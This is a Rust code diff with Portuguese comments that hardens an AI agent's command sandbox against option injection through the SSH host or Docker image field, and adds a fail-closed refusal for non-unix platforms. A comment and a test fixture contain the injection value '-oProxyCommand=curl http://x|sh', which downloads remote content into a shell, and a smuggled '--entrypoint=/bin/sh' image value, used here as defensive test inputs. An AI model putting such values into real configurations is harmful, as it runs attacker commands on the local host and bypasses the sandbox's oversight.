@@ -11,7 +11,8 @@
 //!   não substituto do safety gate).
 //! - OpenShell e Crabbox **não estão implementados** — não há variante de
 //!   `SandboxBackend` para eles e nenhuma entrega prometida; o assunto está
-//!   registrado na #1225. Backends que existem: Docker, Podman e SSH.
+//!   registrado na #1225 (issue de tracking, slices S2/S3). Backends que
+//!   existem: Docker, Podman e SSH.
 //! - **Unix na prática**: o `BashTool` escolhe `powershell -Command` no
 //!   Windows e entregaria a ele uma linha com quoting POSIX. Ligar o sandbox
 //!   fora de unix não contém nada — ver `docs/security/threat-model.md` §5.12.
@@ -38,6 +39,53 @@ use std::path::Path;
 /// backend ausente, fail-open no conteúdo — o pior dos dois.
 fn sh_quote(s: &str) -> String {
     format!("'{}'", s.replace('\'', r"'\''"))
+}
+
+/// Um valor que ocupa posição numa linha de comando e que o programa alvo
+/// leria como **opção** se começasse com `-`.
+///
+/// `sh_quote` garante um token único — isso barra injeção de *comando*, não
+/// de *opção*. O host fica antes do `--` em `ssh {host} -- sh -lc …`, então
+/// `ssh '-oProxyCommand=curl http://x|sh' -- …` continua sendo um token só e
+/// o `ssh` o lê como flag: o comando do atacante roda no host **local**, sem
+/// passar pelo `safety_gate` (que já correu, sobre o comando de dentro). O
+/// mesmo vale para `image`, que é posicional do `docker run`.
+///
+/// Nenhum host real e nenhuma imagem real começa com `-`, então a defesa é
+/// recusar em vez de tentar escapar. Isto aqui é a terceira camada: o
+/// `garra config check` recusa antes do boot e `sandbox_policy_from` recusa
+/// na construção da policy. A camada de dentro existe porque uma
+/// `SandboxPolicy` também pode ser montada por código (ou desserializada)
+/// sem passar por nenhuma das duas.
+///
+/// O conserto estrutural — montar argv em vez de uma linha de shell — é
+/// acompanhamento na #1225 (slices S2/S3), como já recomendado na #1231.
+fn parece_opcao(valor: &str) -> bool {
+    valor.trim_start().starts_with('-')
+}
+
+/// Se o wrap de sandbox pode acontecer na plataforma alvo.
+///
+/// Parametrizado em `alvo_unix` em vez de ler `cfg!(unix)` por dentro para o
+/// ramo não-unix ser exercitável por teste a partir de qualquer host — caso
+/// contrário ele só teria cobertura num runner Windows, que é o mesmo que
+/// dizer "nunca".
+///
+/// Fora de unix o `BashTool` escolhe `powershell -Command` e receberia uma
+/// linha com quoting POSIX (`docker run … sh -lc '…'`). O PowerShell escapa
+/// aspa simples como `''`, não como `'\''`, então a linha não volta a ser o
+/// comando original: o resultado é contenção que parece ligada e não é.
+/// Fail-closed é a única resposta honesta.
+fn plataforma_permite_wrap(alvo_unix: bool) -> Result<()> {
+    if alvo_unix {
+        Ok(())
+    } else {
+        Err(Error::Agent(
+            "sandbox nao suportado fora de unix: o bash tool usa `powershell -Command`, que nao \
+             reparseia o quoting POSIX do wrap. Defina agent.sandbox.mode = off."
+                .into(),
+        ))
+    }
 }
 
 /// Backend de sandbox disponível.
@@ -163,6 +211,16 @@ impl SandboxPolicy {
         if !self.requires_sandbox(tool_name) {
             return Ok(None);
         }
+        plataforma_permite_wrap(cfg!(unix))?;
+        if parece_opcao(&self.image) {
+            // O valor nao entra na mensagem: ele pode carregar o comando do
+            // atacante, e o erro vai para o log e para a resposta da tool.
+            return Err(Error::Agent(
+                "sandbox fail-closed: agent.sandbox.image comeca com `-` e seria lida como opcao \
+                 do docker/podman em vez de nome de imagem"
+                    .into(),
+            ));
+        }
         let backend = self.backend.as_ref().ok_or_else(|| {
             Error::Agent(
                 "sandbox obrigatório por config mas nenhum backend definido \
@@ -170,6 +228,18 @@ impl SandboxPolicy {
                     .into(),
             )
         })?;
+        // Antes do `is_available()` de proposito: num host sem cliente `ssh` o
+        // erro de backend ausente mascararia o de injecao de opcao, e o
+        // operador consertaria o sintoma errado.
+        if let SandboxBackend::Ssh(host) = backend
+            && parece_opcao(host)
+        {
+            return Err(Error::Agent(
+                "sandbox fail-closed: o host do ssh comeca com `-` e seria lido como opcao do \
+                 ssh (ex.: -oProxyCommand), executando no host LOCAL"
+                    .into(),
+            ));
+        }
         if !backend.is_available() {
             return Err(Error::Agent(format!(
                 "sandbox fail-closed: backend `{}` não encontrado no host; \
@@ -319,6 +389,93 @@ mod tests {
             Ok(None) => panic!("sandbox obrigatório não pode devolver None"),
             Err(e) => assert!(e.to_string().contains("fail-closed")),
         }
+    }
+
+    /// #1225 F1: `sh_quote` garante UM token — nao garante que o token seja
+    /// um *operando*. Um host comecando com `-` fica antes do `--` e o `ssh`
+    /// o le como flag; `-oProxyCommand=…` executaria no host LOCAL, que e o
+    /// inverso exato do proposito do sandbox, e ja depois do `safety_gate`.
+    #[test]
+    fn ssh_host_comecando_com_hifen_e_recusado_fail_closed() {
+        let p = SandboxPolicy {
+            mode: SandboxMode::All,
+            backend: Some(SandboxBackend::Ssh(
+                "-oProxyCommand=curl http://x|sh".into(),
+            )),
+            mount_workdir: false,
+            ..SandboxPolicy::default()
+        };
+        let err = p
+            .wrap_command("bash", "echo oi", "/tmp")
+            .expect_err("host que parece opcao tem de ser recusado");
+        let msg = err.to_string();
+        assert!(msg.contains("fail-closed"), "msg = {msg}");
+        // A mensagem vai para log e para a resposta da tool: o valor do
+        // atacante nao pode viajar junto.
+        assert!(!msg.contains("ProxyCommand=curl"), "vazou o valor: {msg}");
+        // E o desfecho NAO pode depender de haver cliente ssh no host: este
+        // guard roda antes do `is_available()` justamente por isso.
+        assert!(
+            !msg.contains("não encontrado no host"),
+            "o erro de backend ausente mascarou o de injecao de opcao: {msg}"
+        );
+    }
+
+    /// Mesma classe, outro posicional: `image` fica antes do `sh -lc` na
+    /// linha do `docker run`, entao um `-…` desloca todo o resto.
+    #[test]
+    fn image_comecando_com_hifen_e_recusada_fail_closed() {
+        let p = SandboxPolicy {
+            mode: SandboxMode::All,
+            backend: Some(SandboxBackend::Docker),
+            image: "--entrypoint=/bin/sh".into(),
+            ..SandboxPolicy::default()
+        };
+        let err = p
+            .wrap_command("bash", "echo oi", "/tmp")
+            .expect_err("imagem que parece opcao tem de ser recusada");
+        assert!(err.to_string().contains("fail-closed"), "err = {err}");
+        assert!(!err.to_string().contains("entrypoint"), "vazou: {err}");
+    }
+
+    /// O guard so vale onde o sandbox se aplica: `mode = off` continua
+    /// devolvendo `None` sem olhar imagem nem backend.
+    #[test]
+    fn guard_de_opcao_nao_bloqueia_quando_sandbox_nao_se_aplica() {
+        let p = SandboxPolicy {
+            mode: SandboxMode::Off,
+            backend: Some(SandboxBackend::Ssh("-oProxyCommand=x".into())),
+            image: "-x".into(),
+            ..SandboxPolicy::default()
+        };
+        assert_eq!(p.wrap_command("bash", "ls", "/tmp").expect("off"), None);
+    }
+
+    #[test]
+    fn parece_opcao_reconhece_hifen_apos_espaco_e_ignora_nome_normal() {
+        assert!(parece_opcao("-o"));
+        assert!(parece_opcao("--entrypoint=x"));
+        assert!(
+            parece_opcao("  -oProxyCommand=x"),
+            "espaco a esquerda nao salva"
+        );
+        assert!(!parece_opcao("debian:bookworm-slim"));
+        assert!(!parece_opcao("box.interno"));
+        assert!(!parece_opcao("host-com-hifen-no-meio"));
+    }
+
+    /// #1225 F2: fora de unix o `BashTool` usa `powershell -Command` e
+    /// receberia uma linha com quoting POSIX. O contrato e fail-closed, e os
+    /// dois ramos sao exercitados a partir de qualquer host porque a decisao
+    /// mora numa funcao parametrizada.
+    #[test]
+    fn plataforma_nao_unix_falha_fechado() {
+        assert!(plataforma_permite_wrap(true).is_ok());
+        let err = plataforma_permite_wrap(false).expect_err("nao-unix recusa");
+        assert!(
+            err.to_string().contains("nao suportado fora de unix"),
+            "err = {err}"
+        );
     }
 
     #[test]
